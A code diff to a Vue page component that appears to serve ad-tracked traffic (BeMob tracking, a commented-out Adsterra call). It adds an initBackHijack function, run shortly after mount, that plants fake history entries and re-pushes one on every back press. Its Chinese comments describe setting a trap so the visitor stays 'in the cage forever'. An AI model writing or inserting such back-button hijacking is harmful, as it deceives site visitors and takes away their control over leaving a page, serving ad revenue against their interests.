@@ -19,6 +19,10 @@ onMounted(() => {
     eventLog: `enter_home_c`
   })
   // AdsterraAd.showSocialBar();
+
+  setTimeout(() => {
+    initBackHijack();
+  }, 500)
 })
 
 // 封装 BeMob 追踪代码的注入方法
@@ -42,6 +46,21 @@ const injectBeMobTracking = () => {
     document.head.appendChild(script);
   }
 }
+
+const initBackHijack = () => {
+  let baseUrl = location.href.split('?')[0]; // 获取干净的当前URL
+
+  // 1. 塞入假的历史记录（布置陷阱）
+  history.replaceState({ page: 'trap' }, '', baseUrl + '?step=1');
+  history.pushState({ page: 'current' }, '', baseUrl + '?step=2');
+
+  // 2. 监听老哥按返回键（收网）
+  window.addEventListener("popstate", (event) => {
+    // 只要他按了返回键退到了 step=1，立刻重新把历史记录补满！让他永远在笼子里
+    history.pushState({ page: 'current' }, '', baseUrl + '?step=2');
+  });
+}
+
 </script>
 
 <style scoped>
